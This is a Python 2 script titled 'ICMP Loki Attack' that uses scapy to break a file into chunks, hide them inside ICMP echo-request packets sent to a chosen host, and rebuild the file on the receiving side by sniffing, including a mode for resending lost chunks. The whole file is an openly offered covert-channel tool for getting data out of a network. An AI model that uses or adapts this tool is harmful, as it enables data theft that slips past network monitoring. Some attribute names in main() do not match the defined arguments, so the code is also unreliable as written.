# -*- coding: utf-8 -*-
import sys, argparse, time, codecs
from scapy.all import *

conf.verb = 0
options = None


def Main_Title() :
    print "######################################################"
    print "##                                                  ##"
    print "##            ICMP Loki Attack 1.0.0                ##"    
    print "##                                                  ##"
    print "##                                                  ##"    
    print "##                            Developed by nam3z1p  ##"
    print "######################################################"
    print "Usage : ICMP_Loki_Attack -I 127.0.0.1 -F FileName [-L] [-C FileName]"
    print ""


def SendICMP(openFile, dsthost):

    with codecs.open(openFile, "rb") as inputdata :
        data = inputdata.read()        

    FileSize = os.path.getsize(openFile)    
    FileSizeCount = FileSize/1450 + 1

    host = dsthost

    print '[+] Send ip : %s' % dsthost
    print '[+] Data Size is %d Bytes' % FileSize
    print '[+] Data Count : %d ' % FileSizeCount

    i = 0
    j = 1
    z = 1
    while i < FileSize:
        print "[+] Send Packet %d " % z
        icmpdata = "%s%s" % (j,data[i:i+1450])
        time.sleep(0.1)        
        pack = IP(dst=host)/ICMP(type="echo-request")/icmpdata
        send(pack)
        i = i + 1450
        j = j + 1 
        z = z + 1       
        if (j % 10) == 0 :
            j = 0    

    print '[+] ICMP Data Send'


def ReceiveICMP(openFile, srchost, filecount):

    f = codecs.open(openFile, "wb")

    filter = "icmp[icmptype] != icmp-echoreply and src host " + srchost
    print '[+] Sniffing ip : %s ' % srchost
    print '[+] Data Count : %d ' % int(filecount)

    save_packets = sniff(int(filecount), filter=filter)
    wrpcap('test.pcap', save_packets)

    packets = rdpcap('test.pcap')

    alist = []

    i = 1
    j = 1
    z = 0
    for p in packets:
        if j > int(filecount):
            break
        while True :
            if int(p['Raw'].load[0]) > 9 :
                print '[-] Packets Receive Error'
                return 0
            if p['Raw'].load[0] == str(i):
                f.write(p['Raw'].load[1:1451])
                break
            else :
                z= z + 1
                f.write("A3SC%sA3SC"%z)
                alist.append(j)
                print "[-] Lose Data Packet Number : %s" % j
            j = j + 1
            i = i + 1
            if (i % 10) == 0 :
                i = 0
        j = j + 1
        i = i + 1
        if (i % 10) == 0 :
            i = 0
    
    f.close()

    FileSize = os.path.getsize(openFile)

    if z > 1 :
        print '[-] Lose Data Packet Count : %d ' % z
    print '[+] Lose Data Packet List : %s ' % alist
    print '[+] Receive Data Size : %d' % FileSize
    print '[+] ICMP Data Received'


def LoseDataSendICMP(openFile, dsthost, loseNumberList):

    with codecs.open(openFile, "rb") as inputdata :
        data = inputdata.read()        

    FileSize = os.path.getsize(openFile)
    FileSizeCount = FileSize/1450 + 1

    host = dsthost

    print '[+] Send ip : %s' % dsthost
    print '[+] Data Size is %d Bytes' % FileSize

    i = 0
    j = 1
    z = 1
    for p in loseNumberList :
        while True :
            if z == p :
                print "[+] Send Packet %d " % z
                icmpdata = "%s%s" % (j,data[i:i+1450])
                pack = IP(dst=host)/ICMP(type="echo-request")/icmpdata
                send(pack)
                break
            i = i + 1450
            j = j + 1
            z = z + 1
            if (j % 10) == 0 :
                j = 0

    print '[+] ICMP Data Send'


def LoseDataReceiveICMP(openFile, srchost, filecount):

    filter = "icmp[icmptype] != icmp-echoreply and src host " + srchost
    print '[+] Sniffing ip : %s ' % srchost
    print '[+] Data Count : %d ' % int(filecount)

    save_packets = sniff(int(filecount), filter=filter)
    wrpcap('LoseDataTest.pcap', save_packets)
    packets = rdpcap('LoseDataTest.pcap')

    f = codecs.open("LoseData_"+openFile, "wb")
    
    with codecs.open(openFile, "rb") as inputdata :
        data = inputdata.read()
        data = data.encode("hex")
    
    z = 1
    for p in packets:
        old = '41335343%s41335343' % str(z).encode("hex")
        losedata = "%s" % p['Raw'].load[1:1451].encode("hex")
        data = data.replace(old, losedata)
        z = z + 1

    f.write(data.decode("hex"))
    f.close()

    FileSize = os.path.getsize(openFile)

    print '[+] Receive Data Size : %d' % FileSize
    print '[+] ICMP LoseData Received'


def main() :

    parser = argparse.ArgumentParser()
    parser.add_argument("-I", "--ip", type=str, default=None, help="Source & Destination ip")
    parser.add_argument("-F", "--fileName", type=str, default=None, help="Send & Receive FileName")
    parser.add_argument("-L", "--loseData", action="store_true", help="LoseData Send & Receive")
    parser.add_argument("-C", "--fileSizeCount", type=str, default=None , help="FileSize Count Check")
    options, unparsed = parser.parse_known_args()

    Main_Title()

    if options.fileSizeCount != None :
        FileSize = os.path.getsize(options.DataCountCheck)
        FileSizeCount = FileSize/1450 + 1
        print '[+] Receive Data Size is %d Bytes' % FileSize
        print '[+] Data Count : %d ' % FileSizeCount
        print '[+] Done'
        return 0

    options_number = raw_input("[+] 1. Send 2. Receive : ")

    if options_number == "1" :
        if options.ip != None :
            if options.FileName != None :
                if options.loseData :
                    losedata_number = raw_input("[+] LoseData Number Input (ex) 10, 20, 30 : ")
                    losedata_number_list = map(int, losedata_number.split(','))
                    print '[+] LoseData Send ICMP Data'
                    LoseDataSendICMP(options.FileName, options.ip, losedata_number_list)
                else :
                    print '[+] Send ICMP Data'
                    SendICMP(options.FileName, options.ip)
            else :
                print '[-] Error Input FileName Please ...'
        else :
            print '[-] Error Input ip Please ...'

    elif options_number == "2" :
        if options.ip != None :
            if options.FileName != None :
                datacount_number = raw_input("[+] Data Count Number Input : ")
                if options.loseData :
                    print '[+] LoseData Receive ICMP Data'
                    LoseDataReceiveICMP(options.FileName, options.ip, datacount_number)
                else : 
                    print '[+] Receive ICMP Data'
                    ReceiveICMP(options.FileName, options.ip, datacount_number)
            else :
                print '[-] Error Input FileName Please ...'
        else :
            print '[-] Error Input ip Please ...'
    else :
        print '[-] Options Number Input Please ...'

    print '[+] Done'

if __name__ == "__main__":   
    main();
